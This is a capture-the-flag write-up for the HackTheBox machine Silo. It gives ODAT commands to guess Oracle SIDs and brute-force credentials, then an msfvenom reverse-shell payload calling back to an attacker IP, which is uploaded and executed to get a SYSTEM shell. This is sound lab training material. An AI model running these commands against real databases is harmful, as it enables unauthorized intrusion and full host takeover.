This method involves using `ODAT` tool to completely exploit the machine and directly getting the `root` shell.

Firstly, to exploit an Oracle database, you need to identify its `Oracle System ID (SID)` string. This is a string that is used to uniquely identify a particular database on a system. This can be done using the `sidguesser` module in ODAT.

```
python3 odat.py sidguesser -s 10.10.10.82 -p 1521

OR 

python3 odat sidguesser -s 10.10.10.82 -p 1521
```

We find 4 SIDs, and we use the `XE` to enumerate the machine further.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes]
└─$  odat sidguesser -s 10.10.10.82 -p 1521 

[1] (10.10.10.82:1521): Searching valid SIDs
[1.1] Searching valid SIDs thanks to a well known SID list on the 10.10.10.82:1521 server
[+] 'XE' is a valid SID. Continue...                                    #################################################################  | ETA:  00:00:05 
100% |#####################################################################################################################################| Time: 00:10:33 
[1.2] Searching valid SIDs thanks to a brute-force attack on 1 chars now (10.10.10.82:1521)
100% |#####################################################################################################################################| Time: 00:00:29 
[1.3] Searching valid SIDs thanks to a brute-force attack on 2 chars now (10.10.10.82:1521)
[+] 'MK' is a valid SID. Continue...                                                                                                       | ETA:  00:05:15 
[+] 'XE' is a valid SID. Continue...                                    ####################################################               | ETA:  00:01:13 
100% |#####################################################################################################################################| Time: 00:10:57 
[+] SIDs found on the 10.10.10.82:1521 server: XE,MK
```

Now, the second thing to do is enumerate valid credentials. This can be done using the passwordguesser module in ODAT. I tried both account files that come with the ODAT installation, however, the tool didn’t find any valid credentials. So instead, let’s locate the credential list that the Metasploit framework uses.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Silo]
└─$ locate oracle_default_userpass.txt
/usr/share/metasploit-framework/data/wordlists/oracle_default_userpass.txt
```

Copying the `oracle_default_userpass.txt` to odat's `/account` directory

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Silo]
└─$ sudo cp /usr/share/metasploit-framework/data/wordlists/oracle_default_userpass.txt /opt/odat/accounts/
```

The username and passwords in this list are separated by a space instead of a forward slash (/). We’ll have to change it to forward slash so that the ODAT tool is able to parse the file. This can be done in vi using the following command.

```
:%s/ /\//g
```

Now that we have a proper list, we can use the `passwordguesser` module to brute force credentials.

```
odat passwordguesser -s 10.10.10.82 -p 1521 -d XE --accounts-file accounts/oracle_default_userpass.txt
```

This takes a while but it ends up finding credentials!

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Silo]
└─$ odat passwordguesser -s 10.10.10.82 -p 1521 -d XE --accounts-file /opt/odat/accounts/oracle_default_userpass.txt

[1] (10.10.10.82:1521): Searching valid accounts on the 10.10.10.82 server, port 1521                                                                       
09:26:33 WARNING -: The line 'jl/jl/\n' is not loaded in credentials list: ['jl', 'jl', '']
09:26:33 WARNING -: The line 'ose$http$admin/invalid/password\n' is not loaded in credentials list: ['ose$http$admin', 'invalid', 'password']
The login brio_admin has already been tested at least once. What do you want to do:                                                        | ETA:  --:--:-- 
- stop (s/S)
- continue and ask every time (a/A)
- skip and continue to ask (p/P)
- continue without to ask (c/C)
c
[+] Valid credentials found: scott/tiger. 
```

Now that we have a valid SID and username/password, let’s see if we can get code execution on the box.

ODAT has a utlfile module that allows you to upload, download or delete a file. Since we are trying to get code execution on the box, let’s upload a malicious executable that sends a reverse shell back to our attack machine.

First, generate the executable using msfvenom.
      
```
msfvenom -p windows/x64/shell_reverse_tcp  LHOST=10.10.16.3 LPORT=1234 -f exe > shell.exe
```

Next, upload the file using the utlfile module.

```
odat utlfile -s 10.10.10.82 -p 1521 -U "scott" -P "tiger" -d XE --putFile /temp shell.exe ../../htb/silo/shell.exe 
```

I got an unexpected error.
```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes]
└─$ odat utlfile -s 10.10.10.82 -p 1521 -U "scott" -P "tiger" -d XE --putFile /temp shell.exe ../../htb/silo/shell.exe 

[1] (10.10.10.82:1521): Put the ../../htb/silo/shell.exe local file in the /temp folder like shell.exe on the 10.10.10.82 server
[-] Impossible to put the ../../htb/silo/shell.exe file: `ORA-01031: insufficient privileges`

```

We don’t have sufficient privileges to upload a file. Let’s see if the user was given sysdba privileges by adding the `sysdba` flag to our command.

```
python3 odat.py utlfile -s 10.10.10.82 -p 1521 -U "scott" -P "tiger" -d XE --putFile /temp shell.exe ../../htb/silo/shell.exe --sysdba
```

Now we need to execute the file. We can do that using the externaltable module in ODAT.

First setup a listener on the attack machine to receive the reverse shell.

```
nc -lvnp 1234
```

```
python3 odat.py externaltable -s 10.10.10.82 -p 1521 -U "scott" -P "tiger" -d XE --exec /temp shell.exe --sysdba
```

The database must have been running with SYSTEM privileges and so we got a shell as `SYSTEM`.

```

```

The database must have been running with SYSTEM privileges and so we got a shell as SYSTEM.
